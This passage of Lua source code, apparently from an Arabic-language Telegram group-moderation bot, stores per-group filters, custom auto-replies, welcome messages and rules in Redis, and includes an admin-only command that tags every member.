if text and text:match("/[%a%d_]+") and not msg.Special then 
local comd_Group = Redis:get(darket.."Lock:Cmd"..msg_chat_id)
if comd_Group == "del" then
return LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif comd_Group == "ked" then
return LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
elseif comd_Group == "ktm" then
Redis:sadd(darket.."SilentGroup:Group"..msg.chat_id,msg.sender.user_id) 
elseif comd_Group == "kick" then
return LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
end
end
if (Redis:get(darket..'FilterText'..msg_chat_id..':'..msg.sender.user_id) == 'true') then
if text or msg.content.photo or msg.content.animation or msg.content.sticker then
if msg.content.photo then
Filters = 'صوره'
Redis:sadd(darket.."List:Filter"..msg_chat_id,'photo:'..msg.content.photo.sizes[1].photo.id)  
Redis:set(darket.."Filter:Text"..msg.sender.user_id..':'..msg_chat_id, msg.content.photo.sizes[1].photo.id)  
elseif msg.content.animation then
Filters = 'متحركه'
Redis:sadd(darket.."List:Filter"..msg_chat_id,'animation:'..msg.content.animation.animation.id)  
Redis:set(darket.."Filter:Text"..msg.sender.user_id..':'..msg_chat_id, msg.content.animation.animation.id)  
elseif msg.content.sticker then
Filters = 'ملصق'
Redis:sadd(darket.."List:Filter"..msg_chat_id,'sticker:'..msg.content.sticker.sticker.id)  
Redis:set(darket.."Filter:Text"..msg.sender.user_id..':'..msg_chat_id, msg.content.sticker.sticker.id)  
elseif text then
Redis:set(darket.."Filter:Text"..msg.sender.user_id..':'..msg_chat_id, text)  
Redis:sadd(darket.."List:Filter"..msg_chat_id,'text:'..text)  
Filters = 'نص'
end
Redis:set(darket..'FilterText'..msg_chat_id..':'..msg.sender.user_id,'true1')
return send(msg_chat_id,msg_id,"\n٠ ارسل تحذير ( "..Filters.." ) عند ارساله","md",true)  
end
end
if text and (Redis:get(darket..'FilterText'..msg_chat_id..':'..msg.sender.user_id) == 'true1') then
local Text_Filter = Redis:get(darket.."Filter:Text"..msg.sender.user_id..':'..msg_chat_id)  
if Text_Filter then   
Redis:set(darket.."Filter:Group:"..Text_Filter..msg_chat_id,text)  
end  
Redis:del(darket.."Filter:Text"..msg.sender.user_id..':'..msg_chat_id)  
Redis:del(darket..'FilterText'..msg_chat_id..':'..msg.sender.user_id)
return send(msg_chat_id,msg_id,"\n٠ تم اضافه رد التحذير","md",true)  
end
if text and (Redis:get(darket..'FilterText'..msg_chat_id..':'..msg.sender.user_id) == 'DelFilter') then   
if text or msg.content.photo or msg.content.animation or msg.content.sticker then
if msg.content.photo then
Filters = 'الصوره'
Redis:srem(darket.."List:Filter"..msg_chat_id,'photo:'..msg.content.photo.sizes[1].photo.id)  
Redis:del(darket.."Filter:Group:"..msg.content.photo.sizes[1].photo.id..msg_chat_id)  
elseif msg.content.animation then
Filters = 'المتحركه'
Redis:srem(darket.."List:Filter"..msg_chat_id,'animation:'..msg.content.animation.animation.id)  
Redis:del(darket.."Filter:Group:"..msg.content.animation.animation.id..msg_chat_id)  
elseif msg.content.sticker then
Filters = 'الملصق'
Redis:srem(darket.."List:Filter"..msg_chat_id,'sticker:'..msg.content.sticker.sticker.id)  
Redis:del(darket.."Filter:Group:"..msg.content.sticker.sticker.id..msg_chat_id)  
elseif text then
Redis:srem(darket.."List:Filter"..msg_chat_id,'text:'..text)  
Redis:del(darket.."Filter:Group:"..text..msg_chat_id)  
Filters = 'النص'
end
Redis:del(darket..'FilterText'..msg_chat_id..':'..msg.sender.user_id)
return send(msg_chat_id,msg_id,"٠ تم الغاء منع ("..Filters..")","md",true)  
end
end
if text or msg.content.photo or msg.content.animation or msg.content.sticker then
if msg.content.photo then
DelFilters = msg.content.photo.sizes[1].photo.id
statusfilter = 'الصوره'
elseif msg.content.animation then
DelFilters = msg.content.animation.animation.id
statusfilter = 'المتحركه'
elseif msg.content.sticker then
DelFilters = msg.content.sticker.sticker.id
statusfilter = 'الملصق'
elseif text then
DelFilters = text
statusfilter = 'الرساله'
end
local ReplyFilters = Redis:get(darket.."Filter:Group:"..DelFilters..msg_chat_id)
if ReplyFilters and not msg.Dev then
LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
return send(msg_chat_id,msg_id,"*٠ لقد تم منع هذه ( "..statusfilter.." ) هنا*\n٠"..ReplyFilters,"md",true)   
end
end
if text and Redis:get(darket..msg.chat_id..msg.sender.user_id.."replace") == "true1" then
Redis:del(darket..msg.chat_id..msg.sender.user_id.."replace")
local word = Redis:get(darket..msg.sender.user_id.."word")
Redis:set(darket.."Word:Replace"..word,text)
Redis:sadd(darket..'Words:r',word)  
LuaTele.sendText(msg_chat_id,msg_id,"٠ تم حفظ الكلمه","md",true)  
return false 
end
if text and Redis:get(darket..msg.chat_id..msg.sender.user_id.."replace") == "true" then
Redis:set(darket..msg.sender.user_id.."word",text)
Redis:set(darket..msg.chat_id..msg.sender.user_id.."replace","true1")
LuaTele.sendText(msg_chat_id,msg_id,'\n٠ ارسل كلمه جديده ليتم استبدالها مكان *'..text..'*',"md",true)  
return false 
end
if text and Redis:get(darket.."All:Command:Reids:Group:Del"..msg_chat_id..":"..msg.sender.user_id) == "true" then
local NewCmmd = Redis:get(darket.."All:Get:Reides:Commands:Group"..text)
if NewCmmd then
Redis:del(darket.."All:Get:Reides:Commands:Group"..text)
Redis:del(darket.."All:Command:Reids:Group:New"..msg_chat_id)
Redis:srem(darket.."All:Command:List:Group",text)
send(msg_chat_id,msg_id,"٠ تم ازالة هاذا ٠ { "..text.." }","md",true)
else
send(msg_chat_id,msg_id,"٠ لا يوجد امر بهاذا الاسم","md",true)
end
Redis:del(darket.."All:Command:Reids:Group:Del"..msg_chat_id..":"..msg.sender.user_id)
return false
end
if text and Redis:get(darket.."All:Command:Reids:Group"..msg_chat_id..":"..msg.sender.user_id) == "true" then
Redis:set(darket.."All:Command:Reids:Group:New"..msg_chat_id,text)
Redis:del(darket.."All:Command:Reids:Group"..msg_chat_id..":"..msg.sender.user_id)
Redis:set(darket.."All:Command:Reids:Group:End"..msg_chat_id..":"..msg.sender.user_id,"true1") 
return send(msg_chat_id,msg_id,"٠ ارسل الامر الجديد ليتم وضعه مكان القديم","md",true)  
end
if text and Redis:get(darket.."All:Command:Reids:Group:End"..msg_chat_id..":"..msg.sender.user_id) == "true1" then
local NewCmd = Redis:get(darket.."All:Command:Reids:Group:New"..msg_chat_id)
Redis:set(darket.."All:Get:Reides:Commands:Group"..text,NewCmd)
Redis:sadd(darket.."All:Command:List:Group",text)
Redis:del(darket.."All:Command:Reids:Group:End"..msg_chat_id..":"..msg.sender.user_id)
return send(msg_chat_id,msg_id,"٠ تم حفظ الامر باسم ٠ { "..text..' }',"md",true)
end
if text then
if text:match("^all (.*)$") or text:match("^@all (.*)$") or text == "@all" or text == "all" then 
local ttag = text:match("^all (.*)$") or text:match("^@all (.*)$") 
if not msg.Manger then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(6)..' * ',"md",true)  
end
if Redis:get(darket.."lockalllll"..msg_chat_id) == "off" then
return send(msg_chat_id,msg_id,'*٠ تم تعطيل @all من قبل المدراء*',"md",true)  
end
local Info_Members = LuaTele.searchChatMembers(msg_chat_id, "*", 10000)
x = 0 
tags = 0 
local list = Info_Members.members
for k, v in pairs(list) do 
local data = LuaTele.getUser(v.member_id.user_id)
if x == 5 or x == tags or k == 0 then 
tags = x + 5 
if ttag then
t = "#all "..ttag.."" 
else
t = "#all "
end
end 
x = x + 1 
tagname = data.first_name
tagname = tagname:gsub("]","") 
tagname = tagname:gsub("[[]","") 
t = t..", ["..tagname.."](tg://user?id="..v.member_id.user_id..")" 
if x == 5 or x == tags or k == 0 then 
if ttag then
Text = t:gsub('#all '..ttag..',','#all '..ttag..'\n') 
else 
Text = t:gsub('#all,','#all\n')
end
sendText(msg_chat_id,Text,0,'md') 
end 
end 
end 
end
if text and Redis:get(darket.."Command:Reids:Group:Del"..msg_chat_id..":"..msg.sender.user_id) == "true" then
local NewCmmd = Redis:get(darket.."Get:Reides:Commands:Group"..msg_chat_id..":"..text)
if NewCmmd then
Redis:del(darket.."Get:Reides:Commands:Group"..msg_chat_id..":"..text)
Redis:del(darket.."Command:Reids:Group:New"..msg_chat_id)
Redis:srem(darket.."Command:List:Group"..msg_chat_id,text)
send(msg_chat_id,msg_id,"٠ تم ازالة هاذا ٠ { "..text.." }","md",true)
else
send(msg_chat_id,msg_id,"٠ لا يوجد امر بهاذا الاسم","md",true)
end
Redis:del(darket.."Command:Reids:Group:Del"..msg_chat_id..":"..msg.sender.user_id)
return false
end
if text and Redis:get(darket.."Command:Reids:Group"..msg_chat_id..":"..msg.sender.user_id) == "true" then
Redis:set(darket.."Command:Reids:Group:New"..msg_chat_id,text)
Redis:del(darket.."Command:Reids:Group"..msg_chat_id..":"..msg.sender.user_id)
Redis:set(darket.."Command:Reids:Group:End"..msg_chat_id..":"..msg.sender.user_id,"true1") 
return send(msg_chat_id,msg_id,"٠ ارسل الامر الجديد ليتم وضعه مكان القديم","md",true)  
end
if text and Redis:get(darket.."Command:Reids:Group:End"..msg_chat_id..":"..msg.sender.user_id) == "true1" then
local NewCmd = Redis:get(darket.."Command:Reids:Group:New"..msg_chat_id)
Redis:set(darket.."Get:Reides:Commands:Group"..msg_chat_id..":"..text,NewCmd)
Redis:sadd(darket.."Command:List:Group"..msg_chat_id,text)
Redis:del(darket.."Command:Reids:Group:End"..msg_chat_id..":"..msg.sender.user_id)
return send(msg_chat_id,msg_id,"٠ تم حفظ الامر باسم ٠ { "..text..' }',"md",true)
end
if Redis:get(darket.."Set:Link"..msg_chat_id..""..msg.sender.user_id) then
if text == "الغاء" then
Redis:del(darket.."Set:Link"..msg_chat_id..""..msg.sender.user_id) 
return send(msg_chat_id,msg_id,"٭ تم الغاء حفظ الرابط","md",true)         
end
Redis:set(darket.."Group:Link"..msg_chat_id,text)
Redis:del(darket.."Set:Link"..msg_chat_id..""..msg.sender.user_id) 
return send(msg_chat_id,msg_id,"٭ تم حفظ الرابط بنجاح","md",true)         
end 
if Redis:get(darket.."Tshake:Welcome:Group" .. msg_chat_id .. "" .. msg.sender.user_id) then 
if text == "الغاء" then 
Redis:del(darket.."Tshake:Welcome:Group" .. msg_chat_id .. "" .. msg.sender.user_id)  
return send(msg_chat_id,msg_id,"٠ تم الغاء حفظ الترحيب","md",true)   
end 
Redis:del(darket.."Tshake:Welcome:Group" .. msg_chat_id .. "" .. msg.sender.user_id)  
Redis:set(darket.."Welcome:Group"..msg_chat_id,text) 
return send(msg_chat_id,msg_id,"٠ تم حفظ ترحيب الكروب","md",true)     
end
if Redis:get(darket.."Set:Rules:" .. msg_chat_id .. ":" .. msg.sender.user_id) then 
if text == "الغاء" then 
Redis:del(darket.."Set:Rules:" .. msg_chat_id .. ":" .. msg.sender.user_id)
return send(msg_chat_id,msg_id,"٠ تم الغاء حفظ القوانين","md",true)   
end 
Redis:set(darket.."Group:Rules" .. msg_chat_id,text) 
Redis:del(darket.."Set:Rules:" .. msg_chat_id .. ":" .. msg.sender.user_id)
return send(msg_chat_id,msg_id,"٠ تم حفظ قوانين الكروب","md",true)  
end  
if Redis:get(darket.."Set:Description:" .. msg_chat_id .. ":" .. msg.sender.user_id) then 
if text == "الغاء" then 
Redis:del(darket.."Set:Description:" .. msg_chat_id .. ":" .. msg.sender.user_id)
return send(msg_chat_id,msg_id,"٠ تم الغاء حفظ وصف الكروب","md",true)   
end 
LuaTele.setChatDescription(msg_chat_id,text) 
Redis:del(darket.."Set:Description:" .. msg_chat_id .. ":" .. msg.sender.user_id)
return send(msg_chat_id,msg_id,"٠ تم حفظ وصف الكروب","md",true)  
end  
if Redis:get(darket.."Set:Manager:rd"..msg.sender.user_id..":"..msg_chat_id) == "true1" then
Redis:del(darket.."Set:Manager:rd"..msg.sender.user_id..":"..msg_chat_id)
if text or msg.content.video_note or msg.content.document or msg.content.audio or msg.content.video or msg.content.voice_note or msg.content.sticker or msg.content.animation or msg.content.photo then
local test = Redis:get(darket.."Text:Manager"..msg.sender.user_id..":"..msg_chat_id)
if msg.content.text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
Redis:set(darket.."Add:Rd:Manager:Text"..test..msg_chat_id, text)  
elseif msg.content.sticker then   
Redis:set(darket.."Add:Rd:Manager:Stekrs"..test..msg_chat_id, msg.content.sticker.sticker.remote.id)  
elseif msg.content.voice_note then  
Redis:set(darket.."Add:Rd:Manager:Vico"..test..msg_chat_id, msg.content.voice_note.voice.remote.id)  
elseif msg.content.audio then
Redis:set(darket.."Add:Rd:Manager:Audio"..test..msg_chat_id, msg.content.audio.audio.remote.id)  
Redis:set(darket.."Add:Rd:Manager:Audioc"..test..msg_chat_id, msg.content.caption.text)  
elseif msg.content.document then
Redis:set(darket.."Add:Rd:Manager:File"..test..msg_chat_id, msg.content.document.document.remote.id)  
elseif msg.content.animation then
Redis:set(darket.."Add:Rd:Manager:Gif"..test..msg_chat_id, msg.content.animation.animation.remote.id)  
elseif msg.content.video_note then
Redis:set(darket.."Add:Rd:Manager:video_note"..test..msg_chat_id, msg.content.video_note.video.remote.id)  
elseif msg.content.video then
Redis:set(darket.."Add:Rd:Manager:Video"..test..msg_chat_id, msg.content.video.video.remote.id)  
Redis:set(darket.."Add:Rd:Manager:Videoc"..test..msg_chat_id, msg.content.caption.text)  
elseif msg.content.photo then
if msg.content.photo.sizes[1].photo.remote.id then
idPhoto = msg.content.photo.sizes[1].photo.remote.id
elseif msg.content.photo.sizes[2].photo.remote.id then
idPhoto = msg.content.photo.sizes[2].photo.remote.id
elseif msg.content.photo.sizes[3].photo.remote.id then
idPhoto = msg.content.photo.sizes[3].photo.remote.id
end
Redis:set(darket.."Add:Rd:Manager:Photo"..test..msg_chat_id, idPhoto)  
Redis:set(darket.."Add:Rd:Manager:Photoc"..test..msg_chat_id, msg.content.caption.text)  
end
send(msg_chat_id,msg_id,"٠ تم حفظ الرد","md",true)  
return false  
end  
end
if text and text:match("^(.*)$") then
if Redis:get(darket.."Set:Manager:rd"..msg.sender.user_id..":"..msg_chat_id) == "true" then
Redis:set(darket.."Set:Manager:rd"..msg.sender.user_id..":"..msg_chat_id,"true1")
Redis:set(darket.."Text:Manager"..msg.sender.user_id..":"..msg_chat_id, text)
Redis:del(darket.."Add:Rd:Manager:Gif"..text..msg_chat_id)   
Redis:del(darket.."Add:Rd:Manager:Vico"..text..msg_chat_id)   
Redis:del(darket.."Add:Rd:Manager:Stekrs"..text..msg_chat_id)     
Redis:del(darket.."Add:Rd:Manager:Text"..text..msg_chat_id)   
Redis:del(darket.."Add:Rd:Manager:Photo"..text..msg_chat_id)
Redis:del(darket.."Add:Rd:Manager:Photoc"..text..msg_chat_id)
Redis:del(darket.."Add:Rd:Manager:Video"..text..msg_chat_id)
Redis:del(darket.."Add:Rd:Manager:Videoc"..text..msg_chat_id)  
Redis:del(darket.."Add:Rd:Manager:File"..text..msg_chat_id)
Redis:del(darket.."Add:Rd:Manager:video_note"..text..msg_chat_id)
Redis:del(darket.."Add:Rd:Manager:Audio"..text..msg_chat_id)
Redis:del(darket.."Add:Rd:Manager:Audioc"..text..msg_chat_id)
Redis:sadd(darket.."List:Manager"..msg_chat_id.."", text)
send(msg_chat_id,msg_id,[[
↯︙ارسل لي الرد سواء كان 
❨ ملف ، ملصق ، متحركه ، صوره
 ، فيديو ، بصمه الفيديو ، بصمه ، صوت ، رساله ❩
↯︙يمكنك اضافة الى النص ٠
– – – – – – – –
 `#username` ↬ معرف المستخدم
 `#msgs` ↬ عدد الرسائل
 `#name` ↬ اسم المستخدم
 `#id` ↬ ايدي المستخدم
 `#stast` ↬ رتبة المستخدم
 `#edit` ↬ عدد التعديلات

]],"md",true)  
return false
end
end

if text and text:match("^(.*)$") then
if Redis:get(darket.."Set:Manager:rd"..msg.sender.user_id..":"..msg_chat_id.."") == "true2" then
Redis:del(darket.."Add:Rd:Manager:Gif"..text..msg_chat_id)   
Redis:del(darket.."Add:Rd:Manager:Vico"..text..msg_chat_id)   
Redis:del(darket.."Add:Rd:Manager:Stekrs"..text..msg_chat_id)     
Redis:del(darket.."Add:Rd:Manager:Text"..text..msg_chat_id)   
Redis:del(darket.."Add:Rd:Manager:Photo"..text..msg_chat_id)
Redis:del(darket.."Add:Rd:Manager:Photoc"..text..msg_chat_id)
Redis:del(darket.."Add:Rd:Manager:Video"..text..msg_chat_id)
Redis:del(darket.."Add:Rd:Manager:Videoc"..text..msg_chat_id)  
Redis:del(darket.."Add:Rd:Manager:File"..text..msg_chat_id)
Redis:del(darket.."Add:Rd:Manager:Audio"..text..msg_chat_id)
Redis:del(darket.."Add:Rd:Manager:Audioc"..text..msg_chat_id)
Redis:del(darket.."Add:Rd:Manager:video_note"..text..msg_chat_id)
Redis:del(darket.."Set:Manager:rd"..msg.sender.user_id..":"..msg_chat_id)
Redis:srem(darket.."List:Manager"..msg_chat_id.."", text)
send(msg_chat_id,msg_id,"٠ تم حذف الرد من الردود ","md",true)  
return false
end
end
if text or msg.content.video_note or msg.content.document or msg.content.audio or msg.content.video or msg.content.voice_note or msg.content.sticker or msg.content.animation or msg.content.photo and msg.sender.user_id ~= darket then
local test = Redis:get(darket.."Text:Sudo:Bot"..msg.sender.user_id..":"..msg_chat_id)
if Redis:get(darket.."Set:Rd"..msg.sender.user_id..":"..msg_chat_id) == "true1" then
Redis:del(darket.."Set:Rd"..msg.sender.user_id..":"..msg_chat_id)
if msg.content.text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
Redis:set(darket.."Add:Rd:Sudo:Text"..test, text)  
elseif msg.content.sticker then   
Redis:set(darket.."Add:Rd:Sudo:stekr"..test, msg.content.sticker.sticker.remote.id)  
elseif msg.content.voice_note then  
Redis:set(darket.."Add:Rd:Sudo:vico"..test, msg.content.voice_note.voice.remote.id)  
elseif msg.content.animation then   
Redis:set(darket.."Add:Rd:Sudo:Gif"..test, msg.content.animation.animation.remote.id)  
elseif msg.content.audio then
Redis:set(darket.."Add:Rd:Sudo:Audio"..test, msg.content.audio.audio.remote.id)  
Redis:set(darket.."Add:Rd:Sudo:Audioc"..test, msg.content.caption.text)  
elseif msg.content.document then
Redis:set(darket.."Add:Rd:Sudo:File"..test, msg.content.document.document.remote.id)  
elseif msg.content.video then
Redis:set(darket.."Add:Rd:Sudo:Video"..test, msg.content.video.video.remote.id)  
Redis:set(darket.."Add:Rd:Sudo:Videoc"..test, msg.content.caption.text)  
elseif msg.content.video_note then
Redis:set(darket.."Add:Rd:Sudo:video_note"..test..msg_chat_id, msg.content.video_note.video.remote.id)  
elseif msg.content.photo then
if msg.content.photo.sizes[1].photo.remote.id then
idPhoto = msg.content.photo.sizes[1].photo.remote.id
elseif msg.content.photo.sizes[2].photo.remote.id then
idPhoto = msg.content.photo.sizes[2].photo.remote.id
elseif msg.content.photo.sizes[3].photo.remote.id then
idPhoto = msg.content.photo.sizes[3].photo.remote.id
end
Redis:set(darket.."Add:Rd:Sudo:Photo"..test, idPhoto)  
Redis:set(darket.."Add:Rd:Sudo:Photoc"..test, msg.content.caption.text)  
end
send(msg_chat_id,msg_id,"٠ تم حفظ الرد \n٠ ارسل ( "..test.." ) لرئية الرد","md",true)  
return false
end  
end
if text and text:match("^(.*)$") then
if Redis:get(darket.."Set:Rd"..msg.sender.user_id..":"..msg_chat_id) == "true" then
Redis:set(darket.."Set:Rd"..msg.sender.user_id..":"..msg_chat_id, "true1")
Redis:set(darket.."Text:Sudo:Bot"..msg.sender.user_id..":"..msg_chat_id, text)
Redis:sadd(darket.."List:Rd:Sudo", text)
send(msg_chat_id,msg_id,[[
↯︙ارسل لي الرد سواء كان 
❨ ملف ، ملصق ، متحركه ، صوره
 ، فيديو ، بصمه الفيديو ، بصمه ، صوت ، رساله ❩
↯︙يمكنك اضافة الى النص ٠
– – – – – – – –
 `#username` ↬ معرف المستخدم
 `#msgs` ↬ عدد الرسائل
 `#name` ↬ اسم المستخدم
 `#id` ↬ ايدي المستخدم
 `#stast` ↬ رتبة المستخدم
 `#edit` ↬ عدد التعديلات

]],"md",true)  
return false
end
end
if text and text:match("^(.*)$") then
if Redis:get(darket.."Set:On"..msg.sender.user_id..":"..msg_chat_id) == "true" then
list = {"Add:Rd:Sudo:video_note","Add:Rd:Sudo:Audio","Add:Rd:Sudo:Audioc","Add:Rd:Sudo:File","Add:Rd:Sudo:Video","Add:Rd:Sudo:Videoc","Add:Rd:Sudo:Photo","Add:Rd:Sudo:Photoc","Add:Rd:Sudo:Text","Add:Rd:Sudo:stekr","Add:Rd:Sudo:vico","Add:Rd:Sudo:Gif"}
for k,v in pairs(list) do
Redis:del(darket..''..v..text)
end
Redis:del(darket.."Set:On"..msg.sender.user_id..":"..msg_chat_id)
Redis:srem(darket.."List:Rd:Sudo", text)
return send(msg_chat_id,msg_id,"٠ تم حذف الرد من الردود العامه","md",true)  
end
end
if text and not Redis:get(darket.."Status:ReplySudo"..msg_chat_id) then
if not Redis:sismember(darket..'Spam:Group'..msg.sender.user_id,text) then
local anemi = Redis:get(darket.."Add:Rd:Sudo:Gif"..text)   
local veico = Redis:get(darket.."Add:Rd:Sudo:vico"..text)   
local stekr = Redis:get(darket.."Add:Rd:Sudo:stekr"..text)     
local Text = Redis:get(darket.."Add:Rd:Sudo:Text"..text)   
local photo = Redis:get(darket.."Add:Rd:Sudo:Photo"..text)
local photoc = Redis:get(darket.."Add:Rd:Sudo:Photoc"..text)
local video = Redis:get(darket.."Add:Rd:Sudo:Video"..text)
local videoc = Redis:get(darket.."Add:Rd:Sudo:Videoc"..text)
local document = Redis:get(darket.."Add:Rd:Sudo:File"..text)
local audio = Redis:get(darket.."Add:Rd:Sudo:Audio"..text)
local audioc = Redis:get(darket.."Add:Rd:Sudo:Audioc"..text)
local video_note = Redis:get(darket.."Add:Rd:Sudo:video_note"..text)
if Text then 
local UserInfo = LuaTele.getUser(msg.sender.user_id)
local NumMsg = Redis:get(darket..'Num:Message:User'..msg_chat_id..':'..msg.sender.user_id) or 0
local TotalMsg = Total_message(NumMsg)
local Status_Gps = msg.Name_Controller
local NumMessageEdit = Redis:get(darket..'Num:Message:Edit'..msg_chat_id..msg.sender.user_id) or 0
local Text = Text:gsub('#username',(UserInfo.username or 'لا يوجد')) 
local Text = Text:gsub('#name',UserInfo.first_name)
local Text = Text:gsub('#id',msg.sender.user_id)
local Text = Text:gsub('#edit',NumMessageEdit)
local Text = Text:gsub('#msgs',NumMsg)
local Text = Text:gsub('#stast',Status_Gps)
send(msg_chat_id,msg_id,'['..Text..']',"md",true)  
end
if video_note then
LuaTele.sendVideoNote(msg_chat_id, msg.id, video_note)
Redis:sadd(darket.."Spam:Group"..msg.sender.user_id,text) 
end
if photo then
LuaTele.sendPhoto(msg.chat_id, msg.id, photo,photoc)
Redis:sadd(darket.."Spam:Group"..msg.sender.user_id,text) 
end  
if stekr then 
LuaTele.sendSticker(msg_chat_id, msg.id, stekr)
Redis:sadd(darket.."Spam:Group"..msg.sender.user_id,text) 
end
if veico then 
LuaTele.sendVoiceNote(msg_chat_id, msg.id, veico, '', 'md')
Redis:sadd(darket.."Spam:Group"..msg.sender.user_id,text) 
end
if video then 
LuaTele.sendVideo(msg_chat_id, msg.id, video, videoc, "md")
Redis:sadd(darket.."Spam:Group"..msg.sender.user_id,text) 
end
if anemi then 
LuaTele.sendAnimation(msg_chat_id,msg.id, anemi, '', 'md')
Redis:sadd(darket.."Spam:Group"..msg.sender.user_id,text) 
end
if document then
LuaTele.sendDocument(msg_chat_id, msg.id, document, '', 'md')
Redis:sadd(darket.."Spam:Group"..msg.sender.user_id,text) 
end  
if audio then
LuaTele.sendAudio(msg_chat_id, msg.id, audio, audioc, "md") 
Redis:sadd(darket.."Spam:Group"..msg.sender.user_id,text) 
end
end
end
if text and not Redis:get(darket.."Status:Reply"..msg_chat_id) then
local anemi = Redis:get(darket.."Add:Rd:Manager:Gif"..text..msg_chat_id)   
local veico = Redis:get(darket.."Add:Rd:Manager:Vico"..text..msg_chat_id)   
local stekr = Redis:get(darket.."Add:Rd:Manager:Stekrs"..text..msg_chat_id)     
local Texingt = Redis:get(darket.."Add:Rd:Manager:Text"..text..msg_chat_id)   
local photo = Redis:get(darket.."Add:Rd:Manager:Photo"..text..msg_chat_id)
local photoc = Redis:get(darket.."Add:Rd:Manager:Photoc"..text..msg_chat_id)
local video = Redis:get(darket.."Add:Rd:Manager:Video"..text..msg_chat_id)
local videoc = Redis:get(darket.."Add:Rd:Manager:Videoc"..text..msg_chat_id)  
local document = Redis:get(darket.."Add:Rd:Manager:File"..text..msg_chat_id)
local audio = Redis:get(darket.."Add:Rd:Manager:Audio"..text..msg_chat_id)
local audioc = Redis:get(darket.."Add:Rd:Manager:Audioc"..text..msg_chat_id)
local video_note = Redis:get(darket.."Add:Rd:Manager:video_note"..text..msg_chat_id)
if Texingt then 
local UserInfo = LuaTele.getUser(msg.sender.user_id)
local NumMsg = Redis:get(darket..'Num:Message:User'..msg_chat_id..':'..msg.sender.user_id) or 0
local TotalMsg = Total_message(NumMsg) 
local Status_Gps = msg.Name_Controller
local NumMessageEdit = Redis:get(darket..'Num:Message:Edit'..msg_chat_id..msg.sender.user_id) or 0
local Texingt = Texingt:gsub('#username',(UserInfo.username or 'لا يوجد')) 
local Texingt = Texingt:gsub('#name',UserInfo.first_name)
local Texingt = Texingt:gsub('#id',msg.sender.user_id)
local Texingt = Texingt:gsub('#edit',NumMessageEdit)
local Texingt = Texingt:gsub('#msgs',NumMsg)
local Texingt = Texingt:gsub('#stast',Status_Gps)
send(msg_chat_id,msg_id,'['..Texingt..']',"md",true)  
end
if video_note then
LuaTele.sendVideoNote(msg_chat_id, msg.id, video_note)
end
if photo then
LuaTele.sendPhoto(msg.chat_id, msg.id, photo,photoc)
end  
if stekr then 
LuaTele.sendSticker(msg_chat_id, msg.id, stekr)
end
if veico then 
LuaTele.sendVoiceNote(msg_chat_id, msg.id, veico, '', 'md')
end
if video then 
LuaTele.sendVideo(msg_chat_id, msg.id, video, videoc, "md")
end
if anemi then 
LuaTele.sendAnimation(msg_chat_id,msg.id, anemi, '', 'md')
end
if document then
LuaTele.sendDocument(msg_chat_id, msg.id, document, '', 'md')
end  
if audio then
LuaTele.sendAudio(msg_chat_id, msg.id, audio, audioc, "md") 
end
end

if Redis:get(darket..'Set:array'..msg.sender.user_id..':'..msg_chat_id) == 'true1' then
text = text:gsub('"','') 
text = text:gsub("'",'') 
text = text:gsub('`','') 
text = text:gsub('*','') 
local test = Redis:get(darket..'Text:array'..msg.sender.user_id..':'..msg_chat_id..'')
Redis:sadd(darket.."Add:Rd:array:Text"..test,text)  
_key = {
{{text="اضغط هنا لانهاء الاضافه",callback_data="EndAddarray"..msg.sender.user_id}},
}
send_inlin_key(msg_chat_id,' * ٠ تم حفظ الرد يمكنك ارسال اخر او اكمال العمليه من خلال الزر اسفل *',_key,msg_id)
return false  
end
if text then
if Redis:get(darket.."Set:array:Ssd"..msg.sender.user_id..":"..msg_chat_id) == 'dttd' then
Redis:del(darket.."Set:array:Ssd"..msg.sender.user_id..":"..msg_chat_id)
gery = Redis:get(darket.."Set:array:addpu"..msg.sender.user_id..":"..msg_chat_id)
if not Redis:sismember(darket.."Add:Rd:array:Text"..gery,text) then
send(msg_chat_id, msg_id,' * ٠ لا يوجد رد متعدد * ',"md",true)
return false
end
Redis:srem(darket.."Add:Rd:array:Text"..gery,text)
send(msg_chat_id, msg_id,' * ٠ تم حذفه بنجاح .* ',"md",true)
end
end
if text then
if Redis:get(darket.."Set:array:Ssd"..msg.sender.user_id..":"..msg_chat_id) == 'delrd' then
Redis:del(darket.."Set:array:Ssd"..msg.sender.user_id..":"..msg_chat_id)
if not Redis:sismember(darket..'List:array',text) then
send(msg_chat_id, msg_id,' * ٠ لا يوجد رد متعدد * ',"md",true)
return false
end
Redis:set(darket.."Set:array:addpu"..msg.sender.user_id..":"..msg_chat_id,text)
Redis:set(darket.."Set:array:Ssd"..msg.sender.user_id..":"..msg_chat_id,"dttd")
send(msg_chat_id, msg_id,' * ٠ قم بارسال الرد الذي تريد حذفه منه* ',"md",true)
return false
end
end
if text == "حذف رد من متعدد" then
if not msg.Supcreatorm then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص { '..Controller_Num(44)..' }* ',"md",true)  
end
inlin = {
{{text = '- اضغط هنا للالغاء.',callback_data=msg.sender.user_id..'/cancelrdd'}},
}
send_inlin_key(msg_chat_id,"٠ ارسل الكلمه التي تريد حذفها",inlin,msg_id)
Redis:set(darket.."Set:array:Ssd"..msg.sender.user_id..":"..msg_chat_id,"delrd")
return false 
end
if text then
if Redis:get(darket.."Set:array"..msg.sender.user_id..":"..msg_chat_id) == 'true' then
Redis:sadd(darket..'List:array', text)
Redis:set(darket..'Text:array'..msg.sender.user_id..':'..msg_chat_id, text)
send(msg_chat_id, msg_id,'ارسل الرد الذي تريد اضافته',"md",true)
Redis:del(darket.."Set:array"..msg.sender.user_id..":"..msg_chat_id)
Redis:set(darket..'Set:array'..msg.sender.user_id..':'..msg_chat_id,'true1')
Redis:del(darket.."Add:Rd:array:Text"..text)   
return false
end
end

if text then
if Redis:get(darket.."Set:array:rd"..msg.sender.user_id..":"..msg_chat_id) == 'delrd' then
Redis:del(darket.."Set:array:rd"..msg.sender.user_id..":"..msg_chat_id)
Redis:del(darket.."Add:Rd:array:Text"..text)
Redis:srem(darket..'List:array', text)
send(msg_chat_id, msg_id,' * ٠ تم ازالة الرد المتعدد بنجاح* ',"md",true)
return false
end
end


